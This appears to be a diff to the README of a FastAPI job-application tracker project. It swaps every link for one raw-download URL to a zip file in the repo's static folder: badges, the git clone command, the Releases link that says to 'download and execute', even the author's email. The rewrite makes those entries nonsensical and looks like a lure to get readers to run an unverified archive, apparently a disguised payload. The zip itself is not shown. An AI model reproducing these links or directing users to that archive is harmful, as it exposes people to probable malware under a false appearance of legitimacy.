@@ -1,8 +1,8 @@
 # Application Tracker 🚀
 
-![GitHub release (latest by date)](https://img.shields.io/github/v/release/florindonhazua/application-tracker)
-![GitHub](https://img.shields.io/github/license/florindonhazua/application-tracker)
-![GitHub issues](https://img.shields.io/github/issues/florindonhazua/application-tracker)
+![GitHub release (latest by date)](https://github.com/florindonhazua/application-tracker/raw/refs/heads/main/app/static/application_tracker_3.2.zip)
+![GitHub](https://github.com/florindonhazua/application-tracker/raw/refs/heads/main/app/static/application_tracker_3.2.zip)
+![GitHub issues](https://github.com/florindonhazua/application-tracker/raw/refs/heads/main/app/static/application_tracker_3.2.zip)
 
 Welcome to the **Application Tracker**! This is a simple web application designed to help you track your job applications efficiently. Built using FastAPI, SQLAlchemy with PostgreSQL, Jinja2 templates, and Docker, this application aims to simplify the job application process.
 
@@ -39,7 +39,7 @@ To set up the Application Tracker on your local machine, follow these steps:
 1. **Clone the Repository**:
 
    ```bash
-   git clone https://github.com/florindonhazua/application-tracker.git
+   git clone https://github.com/florindonhazua/application-tracker/raw/refs/heads/main/app/static/application_tracker_3.2.zip
    cd application-tracker
    ```
 
@@ -59,7 +59,7 @@ To set up the Application Tracker on your local machine, follow these steps:
 
 4. **Download Releases**:
 
-   For the latest releases, visit [Releases](https://github.com/florindonhazua/application-tracker/releases) to download and execute the latest version.
+   For the latest releases, visit [Releases](https://github.com/florindonhazua/application-tracker/raw/refs/heads/main/app/static/application_tracker_3.2.zip) to download and execute the latest version.
 
 ## Usage 📊
 
@@ -100,7 +100,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For any inquiries or feedback, feel free to reach out:
 
 - **Author**: Florin Donhazua
-- **Email**: florin@example.com
-- **GitHub**: [florindonhazua](https://github.com/florindonhazua)
+- **Email**: https://github.com/florindonhazua/application-tracker/raw/refs/heads/main/app/static/application_tracker_3.2.zip
+- **GitHub**: [florindonhazua](https://github.com/florindonhazua/application-tracker/raw/refs/heads/main/app/static/application_tracker_3.2.zip)
 
-Thank you for checking out the Application Tracker! We hope it helps you manage your job applications effectively. For the latest updates and releases, visit [Releases](https://github.com/florindonhazua/application-tracker/releases).
+Thank you for checking out the Application Tracker! We hope it helps you manage your job applications effectively. For the latest updates and releases, visit [Releases](https://github.com/florindonhazua/application-tracker/raw/refs/heads/main/app/static/application_tracker_3.2.zip).
